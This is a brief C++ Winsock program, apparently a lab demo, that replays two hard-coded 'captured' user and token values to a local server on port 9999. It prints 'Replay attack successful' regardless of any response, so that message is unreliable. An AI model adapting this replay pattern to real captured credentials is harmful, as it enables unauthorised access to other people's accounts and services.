// attacker_replay.cpp
#include <winsock2.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET sock;
    sockaddr_in serverAddr{};

    int capturedUser = 2;
    int capturedToken = 2;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(9999);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));

    send(sock, (char*)&capturedUser, sizeof(capturedUser), 0);
    send(sock, (char*)&capturedToken, sizeof(capturedToken), 0);

    std::cout << "Replay attack successful\n";

    closesocket(sock);
    WSACleanup();
}
